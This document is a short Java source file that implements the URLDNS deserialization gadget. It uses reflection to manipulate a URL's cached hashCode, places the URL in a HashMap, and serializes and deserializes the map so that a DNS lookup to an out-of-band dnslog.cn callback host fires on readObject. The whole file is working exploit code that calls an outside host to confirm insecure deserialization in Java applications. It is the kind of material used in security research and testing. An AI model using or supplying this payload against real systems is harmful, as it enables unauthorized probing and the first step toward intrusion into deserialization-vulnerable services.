package reflect;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hash = new HashMap<>();
        URL url     = new URL("http://m8h1aj.dnslog.cn");
//        System.out.println(url.hashCode());
        Field f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);

        f.set(url, 0x1);
//        System.out.println(url.hashCode());
        hash.put(url, 0);
        f.set(url, -1);
//        System.out.println(url.hashCode());

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
        oos.writeObject(hash);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.bin"));
        ois.readObject();
    }
}